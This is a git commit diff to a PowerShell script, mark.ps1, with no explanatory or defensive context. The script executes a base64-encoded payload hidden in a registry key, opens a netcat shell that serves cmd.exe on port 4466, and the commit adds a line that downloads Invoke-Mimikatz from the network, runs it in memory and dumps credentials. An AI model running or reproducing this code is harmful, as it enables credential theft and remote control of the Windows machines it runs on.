63aa1352cbe7f0bedc811027ee7099cfb0c0bfc8
inwestallis <inwestallis@gmail.com>
2020-03-01 12:16:26 +0300

    Update mark.ps1

--- mark.ps1
+++ mark.ps1
@@ -1,4 +1,6 @@
 iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\XSample').XXX)))
 
+iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
+
 $Command = "$Env:temp\nc64.exe -nLvp 4466 -e cmd.exe"
 Invoke-Expression $Command
